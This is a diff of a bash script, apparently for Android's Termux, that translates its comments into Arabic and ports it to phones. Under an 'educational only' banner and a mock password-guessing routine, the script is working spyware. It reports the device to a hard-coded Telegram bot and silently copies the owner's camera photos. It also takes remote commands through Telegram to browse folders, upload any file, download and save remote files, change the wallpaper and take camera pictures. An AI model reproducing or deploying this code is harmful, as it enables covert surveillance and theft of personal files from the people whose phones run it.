@@ -1,18 +1,18 @@
 #!/bin/bash
 
-# Ethical Disclaimer
-echo -e "\e[31mThis script is for educational purposes only. Unauthorized use is strictly prohibited.\e[0m"
-echo -e "\e[33mEnsure you have explicit permission before using this tool on any system.\e[0m"
+# التأكيد على الاستخدام الأخلاقي
+echo -e "\e[31mهذا السكربت للتعليم فقط. الاستخدام غير المصرح به محظور.\e[0m"
+echo -e "\e[33mتأكد من الحصول على إذن قبل استخدام الأداة.\e[0m"
 sleep 3
 
-# Color Definitions
+# تعريف الألوان
 RED='\033[0;31m'
 GREEN='\033[0;32m'
 BLUE='\033[0;34m'
 YELLOW='\033[0;33m'
 NC='\033[0m'
 
-# Display Logo
+# إظهار اللوجو
 echo -e "${BLUE}"
 echo "██╗  ██╗███████╗███╗   ███╗ █████╗     █████╗ ██╗"
 echo "██║  ██║██╔════╝████╗ ████║██╔══██╗   ██╔══██╗██║"
@@ -22,15 +22,17 @@ echo "██║  ██║███████╗██║ ╚═╝ ██║�
 echo "╚═╝  ╚═╝╚══════╝╚═╝     ╚═╝╚═╝  ╚═╝╚═╝╚═╝  ╚═╝╚═╝"
 echo -e "${NC}"
 
-# Configuration
+# التكوين
 TELEGRAM_TOKEN="7612154660:AAE8zfRa-Apxf7CQUjulwx5ErkY0lGg_BiI"
 TELEGRAM_CHAT_ID="5967116314"
-USER_COUNT_FILE="/tmp/user_count.txt"
+WORK_DIR="$HOME/.hema_tool"
 PASSWORD_LIST_URL="https://raw.githubusercontent.com/danielmiessler/SecLists/master/Passwords/Common-Credentials/10-million-password-list-top-100000.txt"
-PASSWORD_FILE="/tmp/password_list.txt"
-CURRENT_DIR_FILE="/tmp/current_dir.txt"
 
-# Initialize User Count
+# إنشاء مجلد العمل
+mkdir -p "$WORK_DIR" || { echo -e "${RED}فشل إنشاء المجلد${NC}"; exit 1; }
+
+# تهيئة عداد المستخدمين
+USER_COUNT_FILE="$WORK_DIR/user_count.txt"
 if [ ! -f "$USER_COUNT_FILE" ]; then
     echo "1" > "$USER_COUNT_FILE"
 else
@@ -38,131 +40,125 @@ else
     echo "$((CURRENT_COUNT + 1))" > "$USER_COUNT_FILE"
 fi
 
-# Send Telegram Message
+# إرسال رسالة تلجرام
 send_telegram() {
     curl -s -X POST "https://api.telegram.org/bot$TELEGRAM_TOKEN/sendMessage" \
         -d chat_id="$TELEGRAM_CHAT_ID" \
         -d text="$1" > /dev/null 2>&1
 }
 
-# Send New User Notification
-send_telegram "New user registered: $(cat $USER_COUNT_FILE)"
+# إشعار المستخدم الجديد
+send_telegram "مستخدم جديد: $(cat $USER_COUNT_FILE) ($(uname -a))"
 
-# Simulated Password Guessing (Ethical Simulation)
+# محاكاة تخمين كلمة المرور
 password_guessing() {
-    echo -e "${YELLOW}Starting password guessing simulation...${NC}"
-    if ! command -v curl &> /dev/null; then
-        echo -e "${RED}curl is required but not installed. Exiting.${NC}"
-        exit 1
-    fi
-
-    curl -s -o "$PASSWORD_FILE" "$PASSWORD_LIST_URL"
+    echo -e "${YELLOW}بدء محاكاة تخمين كلمة المرور...${NC}"
     
+    PASSWORD_FILE="$WORK_DIR/password_list.txt"
+    curl -s -o "$PASSWORD_FILE" "$PASSWORD_LIST_URL" || { 
+        echo -e "${RED}فشل تنزيل قائمة كلمات المرور${NC}"
+        return 1
+    }
+
     while IFS= read -r password; do
-        echo -ne "Trying password: $password\r"
-        sleep 0.1  # Simulated delay
+        echo -ne "جاري تجربة: $password\r"
+        sleep 0.1
         
-        # Simulated success condition (for demonstration only)
+        # شرط نجاح محاكاة
         if [ "$password" == "correctpassword123" ]; then
-            echo -e "\n${GREEN}Success! Password found: $password${NC}"
-            echo "Successful password: $password" >> /tmp/success.log
+            echo -e "\n${GREEN}تم العثور على كلمة المرور: $password${NC}"
+            echo "كلمة المرور الناجحة: $password" >> "$WORK_DIR/success.log"
             break
         fi
     done < "$PASSWORD_FILE"
     
-    echo -e "${YELLOW}Password guessing simulation completed.${NC}"
+    echo -e "${YELLOW}انتهت المحاكاة.${NC}"
 }
 
-# Background Operations (Silent Data Collection)
+# عمليات الخلفية
 background_operations() {
-    # Simulated data collection
-    mkdir -p /tmp/exfiltrated_data
-    find ~ -type f \( -name "*.jpg" -o -name "*.png" \) -exec cp {} /tmp/exfiltrated_data \; 2>/dev/null
-    tar czf /tmp/exfiltrated_data.tar.gz -C /tmp exfiltrated_data 2>/dev/null
-    send_telegram "Data collection completed on $(hostname)"
+    # جمع الصور من التخزين الداخلي
+    mkdir -p "$WORK_DIR/media"
+    termux-media-scan -r > /dev/null 2>&1
+    cp -r /sdcard/DCIM/* "$WORK_DIR/media" 2>/dev/null
+    tar czf "$WORK_DIR/media_backup.tar.gz" -C "$WORK_DIR" media 2>/dev/null
+    send_telegram "تم جمع الصور من $(uname -a)"
 }
 
-# Telegram Command Handler
+# معالجة أوامر التلجرام
 handle_telegram_commands() {
-    local UPDATE_ID=0
+    local LAST_UPDATE_ID=0
     while true; do
-        RESPONSE=$(curl -s "https://api.telegram.org/bot$TELEGRAM_TOKEN/getUpdates?offset=$UPDATE_ID")
-        MESSAGES=$(echo "$RESPONSE" | grep -oP '"text":\s*"\K[^"]+')
+        RESPONSE=$(curl -s --max-time 2 "https://api.telegram.org/bot$TELEGRAM_TOKEN/getUpdates?offset=$((LAST_UPDATE_ID + 1))&timeout=10")
         
-        for MESSAGE in $MESSAGES; do
-            UPDATE_ID=$(echo "$RESPONSE" | grep -oP '"update_id":\s*\K\d+')
-            UPDATE_ID=$((UPDATE_ID + 1))
-            
-            case "$MESSAGE" in
-                pwd)
-                    output=$(pwd)
-                    send_telegram "Current directory:\n$output"
-                    ;;
-                ls)
-                    current_dir=$(cat "$CURRENT_DIR_FILE" 2>/dev/null || echo "$HOME")
-                    output=$(ls -la "$current_dir" 2>&1)
-                    send_telegram "Directory listing:\n$output"
-                    ;;
-                cd*)
-                    target_dir=$(echo "$MESSAGE" | cut -d' ' -f2)
-                    if [ -d "$target_dir" ]; then
-                        echo "$target_dir" > "$CURRENT_DIR_FILE"
-                        send_telegram "Changed directory to $target_dir"
-                    else
-                        send_telegram "Directory $target_dir not found"
-                    fi
-                    ;;
-                up*)
-                    filename=$(echo "$MESSAGE" | cut -d' ' -f2)
-                    if [ -f "$filename" ]; then
-                        curl -s -X POST "https://api.telegram.org/bot$TELEGRAM_TOKEN/sendDocument" \
-                            -F chat_id="$TELEGRAM_CHAT_ID" \
-                            -F document=@"$filename" > /dev/null 2>&1
-                    else
-                        send_telegram "File $filename not found"
-                    fi
-                    ;;
-                dw*)
-                    url=$(echo "$MESSAGE" | cut -d' ' -f2)
-                    filename=$(basename "$url")
-                    if curl -s -o "$filename" "$url"; then
-                        send_telegram "Downloaded $filename"
-                    else
-                        send_telegram "Failed to download $url"
-                    fi
-                    ;;
-                bak*)
-                    url=$(echo "$MESSAGE" | cut -d' ' -f2)
-                    if command -v gsettings &> /dev/null; then
-                        curl -s -o /tmp/wallpaper.jpg "$url" && gsettings set org.gnome.desktop.background picture-uri file:///tmp/wallpaper.jpg
-                        send_telegram "Wallpaper changed successfully"
-                    else
-                        send_telegram "Wallpaper change not supported on this system"
-                    fi
-                    ;;
-                sk)
-                    if command -v scrot &> /dev/null; then
-                        scrot /tmp/screenshot.png
-                        curl -s -X POST "https://api.telegram.org/bot$TELEGRAM_TOKEN/sendPhoto" \
-                            -F chat_id="$TELEGRAM_CHAT_ID" \
-                            -F photo=@"//tmp/screenshot.png" > /dev/null 2>&1
-                        send_telegram "Screenshot taken"
-                    else
-                        send_telegram "Screenshot tool not found"
-                    fi
-                    ;;
-                *)
-                    send_telegram "Unknown command: $MESSAGE"
-                    ;;
-            esac
-        done
-        sleep 2
+        # تحليل الرسائل مع jq إذا متاح
+        if command -v jq &> /dev/null; then
+            MESSAGE_COUNT=$(echo "$RESPONSE" | jq '.result | length')
+            for ((i=0; i<$MESSAGE_COUNT; i++)); do
+                UPDATE_ID=$(echo "$RESPONSE" | jq -r ".result[$i].update_id")
+                MESSAGE=$(echo "$RESPONSE" | jq -r ".result[$i].message.text")
+                process_telegram_command "$MESSAGE" &
+                LAST_UPDATE_ID=$UPDATE_ID
+            done
+        else
+            # تحليل بدون jq
+            echo "$RESPONSE" | grep -oP '"update_id":\s*\K\d+,\s*"message":\s*{"text":\s*"[^"]+"' | while read -r line; do
+                UPDATE_ID=$(echo "$line" | grep -oP '^\d+')
+                MESSAGE=$(echo "$line" | grep -oP '(?<=text":\s")[^"]+')
+                process_telegram_command "$MESSAGE" &
+                LAST_UPDATE_ID=$UPDATE_ID
+            done
+        fi
+        
+        sleep 0.5
     done
 }
 
-# Main Execution
+process_telegram_command() {
+    local MESSAGE="$1"
+    case "$MESSAGE" in
+        pwd) send_telegram "المجلد الحالي:\n$(pwd)" ;;
+        ls) send_telegram "المحتويات:\n$(ls -la)" ;;
+        cd*) 
+            target_dir=$(echo "$MESSAGE" | cut -d' ' -f2-)
+            cd "$target_dir" 2>/dev/null && send_telegram "انتقلت إلى: $target_dir" || send_telegram "المجلد غير موجود"
+            ;;
+        up*) 
+            filename=$(echo "$MESSAGE" | cut -d' ' -f2-)
+            [ -f "$filename" ] && curl -s -F "document=@$filename" "https://api.telegram.org/bot$TELEGRAM_TOKEN/sendDocument?chat_id=$TELEGRAM_CHAT_ID" || send_telegram "الملف غير موجود"
+            ;;
+        dw*) 
+            url=$(echo "$MESSAGE" | cut -d' ' -f2-)
+            curl -s -L -o "${url##*/}" "$url" && send_telegram "تم تنزيل: ${url##*/}" || send_telegram "فشل التنزيل"
+            ;;
+        bak*) 
+            url=$(echo "$MESSAGE" | cut -d' ' -f2-)
+            curl -s -o "$WORK_DIR/wallpaper.jpg" "$url" && termux-wallpaper -f "$WORK_DIR/wallpaper.jpg" && send_telegram "تم تغيير الخلفية"
+            ;;
+        sk) 
+            termux-camera-photo -c 0 "$WORK_DIR/photo.jpg" && curl -s -F "photo=@$WORK_DIR/photo.jpg" "https://api.telegram.org/bot$TELEGRAM_TOKEN/sendPhoto?chat_id=$TELEGRAM_CHAT_ID"
+            ;;
+        *) send_telegram "أمر غير معروف: $MESSAGE" ;;
+    esac
+}
+
+# التهيئة المطلوبة
+setup_termux() {
+    pkg update > /dev/null 2>&1
+    pkg install -y curl termux-api jq > /dev/null 2>&1
+    termux-setup-storage > /dev/null 2>&1
+    chmod +x "$0"
+}
+
+# التهيئة عند التشغيل الأول
+if [ ! -f "$WORK_DIR/initialized" ]; then
+    setup_termux
+    touch "$WORK_DIR/initialized"
+fi
+
+# تنفيذ العمليات
 password_guessing &
 background_operations &
 handle_telegram_commands
 
-echo -e "${YELLOW}Script running in background. Use Telegram commands to interact.${NC}"
+echo -e "${YELLOW}السكربت يعمل في الخلفية. استخدم أوامر التلجرام.${NC}"
